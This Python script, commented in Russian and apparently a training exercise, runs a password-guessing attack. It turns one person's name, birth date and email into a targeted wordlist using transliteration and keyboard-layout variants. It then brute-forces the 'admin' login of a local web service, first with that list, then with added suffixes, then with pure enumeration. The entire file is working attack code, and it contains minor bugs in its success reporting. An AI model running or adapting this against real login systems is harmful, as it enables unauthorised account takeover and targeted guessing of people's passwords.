# алфавит полного брутфорса
full_alphabet = '0123456789abcdefghijklmnopqrstuvwxyz'

# алфавит постфикс-брутфорса
alphabet = '0123456789!@#$%^&*?'
# словарь транслитераций
translit = { "а": "a", "б": "b", "в": "v", "г": "g", "д": "d",
    "е": "e", "ё": "yo", "ж": "j", "з": "z", "и": "i", "й" : "y",
    "к": "k", "л": "l", "м": "m", "н": "n", "о": "o", "п": "p",
    "р": "r", "с": "s", "т": "t", "у": "u", "ф": "f", "х": "h",
    "ц": "c", "ч": "ch", "ш": "sh", "щ": "sch", "ъ": "", "ы": "i", "ь": "",
    "э": "e", "ю": "yu", "я": "ya" }
# словарь раскладки Ru-En
locale = { "а": "f", "б": ",", "в": "d", "г": "u", "д": "l",
    "е": "t", "ё": "`", "ж": ";", "з": "p", "и": "b", "й" : "q",
    "к": "r", "л": "k", "м": "v", "н": "y", "о": "j", "п": "g",
    "р": "h", "с": "c", "т": "n", "у": "e", "ф": "a", "х": "[",
    "ц": "w", "ч": "x", "ш": "i", "щ": "o", "ъ": "]", "ы": "s", "ь": "m",
    "э": "'", "ю": ".", "я": "z" }
# множество русских букв
rus_set = set('абвгдежзиклмнопрстуфхцчшщэюя')
# данные пользователя email, имя, фамилия, дата рождения
user_data = ['Петров', 'Василий', '03', '02', '1990', 'vasyapetrov@gmail.com']

# формируем список данных пользователя
dict_data = []
for i in user_data:
    if set(i.lower()).intersection(rus_set):  # если строка с данными содержит русские буквы
        # добавляем в список вариантов строку с переключенной раскладкой и транслитерацию
        res_locale = ''
        res_translit = ''
        for j in i.lower():
            res_locale += locale[j]
            res_translit += translit[j]
        dict_data.append(res_translit.title())    # транслитерация с заглавной буквы
        dict_data.append(res_locale.title())      # En раскладка с заглавной буквы
        dict_data.append(res_translit)          # в нижнем регистре транслитерация
        dict_data.append(res_locale)            # в нижнем регистре En раскладка
        dict_data.append(res_translit.upper())    # в верхнем регистре транслитерация
        dict_data.append(res_locale.upper())      # в верхнем регистре En раскладка
    elif '@' in i:  # из email удаляем постфикс
        dict_data.append(i[:i.find('@')])
    else:  # иначе добавляем в список вариантов строку "как есть"
        dict_data.append(i)

# Формируем файл со всеми вариантами и их возможными комбинациями (до 3 строк из списка в 1 варианте)
with open('combos.txt', 'w') as f:
    for i in dict_data:
        f.write(i +'\n')
        for j in dict_data:
            f.write(i+j+'\n'+j+i+'\n')
            for k in dict_data:
                f.write(i+j+k+'\n' +j+i+k+'\n')

# На этом моменте файлы можно разделить программу на 2 части
#   Верхняя - для подготовки популярных вариантов на основании исходных данных о пользователе
#   Нижняя - атака на сервер
import requests

with open('combos.txt') as f:
    popular_password_data = f.read()

popular_passwords = popular_password_data.split('\n')


# функция подбора пароля из списка в текстовом файле
def generate_bad_password(i, popular_passwords):

    if i >= len(popular_passwords):
        return

    password = popular_passwords[i]
    return password
###################################################

# брутфорс функция
def generate_brute(i, length, alphabet):

    result = ''
    temp = i
    while temp > 0:
        rest = temp % len(alphabet)
        temp //= len(alphabet)
        result += alphabet[rest]

    while len(result) < length:
        result = '0' + result
    if result == alphabet[-1] * length:
        length += 1
        i = 0
    else:
        i += 1

    return i, length, result
##################################################

login = 'admin'
print('login: ', login)
limit = 4
success = False
i = 0
# сначала перебираем популярные варианты
print('Try popular passwords')
while True:
    password = generate_bad_password(i, popular_passwords)
    i += 1
    if password is None:
        break
    print(i, ' password: ', password)
    data = {'login': login, 'password': password}
    response = requests.post('http://127.0.0.1:5000/auth', json=data)
    if response.status_code == 200:
        print('SUCCESS!')
        print('login: ', login)
        print('password:', password)
        success = True
        break

# если подбор по вариантам не помог, комбинируем варианты с брутфорсом до "limit" символов
if not success:
    print('Failed!')
    print('Try Popular + Bruteforce')
    for j in popular_passwords:
        length = 0
        i = 0
        while length <= limit:
            i, length, brute_result = generate_brute(i, length, alphabet) # брутфорсим постфикс

            result = j + brute_result                                       # склеиваем популярный пароль с постфиксом
            print(i, ' password: ', result)
            data = {'login': login, 'password': result}
            response = requests.post('http://127.0.0.1:5000/auth', json=data)
            if response.status_code == 200:
                print('SUCCESS!')
                print('login: ', login)
                print('password:', password)
                success = True
                break

# если не получилось, то брутфорсим "в лоб"
if not success:
    print('Failed!')
    print('Try Bruteforce only')
    length = 0
    i = 0
    while length < limit * limit:
        i, length, result = generate_brute(i, length, full_alphabet)
        print(i, ' password: ', result)
        data = {'login': login, 'password': result}
        response = requests.post('http://127.0.0.1:5000/auth', json=data)
        if response.status_code == 200:
            print('SUCCESS!')
            print('login: ', login)
            print('password:', password)
            success = True
            break

# если не получилось, признаем поражение
if not success:
    print('We Are Crashed by this System! :(')
